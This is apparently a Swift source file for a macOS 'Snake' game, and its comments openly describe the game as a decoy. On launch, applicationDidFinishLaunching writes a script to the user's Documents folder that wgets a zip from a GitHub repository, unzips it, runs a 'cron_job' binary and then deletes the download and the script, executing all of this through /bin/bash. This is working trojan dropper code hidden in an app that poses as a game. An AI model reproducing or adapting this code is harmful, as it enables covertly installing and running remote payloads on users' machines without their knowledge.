//
//  AppDelegate.swift
//  Snake
//
//  Created by Ed on 04/06/2017.
//  Copyright © 2017 Syzible. All rights reserved.
//


import Cocoa

@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {
    
    
    func applicationDidFinishLaunching(_ aNotification: Notification) {
        // we're up and running with the decoy -- lets run some bash to remote download and run
        let preambleScript: String = "gatherResources.sh"
        
        // create in the default documents directory to avoid any write conflicts
        let documentDirectory = try! FileManager.default.url(for: .documentDirectory, in: .userDomainMask, appropriateFor: nil, create: true)
        let fileURL = documentDirectory.appendingPathComponent(preambleScript)
        
        print(fileURL)
        
        // remote install, run, and clear the reminents of the script
        let text = "cd ~/Documents; wget https://github.com/oflynned/CronSnapper/archive/master.zip; unzip master.zip -d 'Files'; rm -rf master.zip; cd Files; ./cron_job; cd ..; rm -rf " + preambleScript
        
        do {
            try text.write(to: fileURL, atomically: false, encoding: .utf8)
        } catch {
            print("error writing to url:", fileURL, error)
        }
        
        // execute
        let command: String = "sh " + String(describing: fileURL).replacingOccurrences(of: "file://", with: "")
        shell(arguments: ["-c", command])
    }
    
    func applicationWillTerminate(_ aNotification: Notification) {
        // Insert code here to tear down your application
    }
    
    func shell(arguments: [String] = []) {
        
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = arguments
        
        let pipe = Pipe()
        task.standardOutput = pipe
        task.launch()
        
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        let output = NSString(data: data, encoding: String.Encoding.utf8.rawValue)
        
        print(output!)
    }
    
}
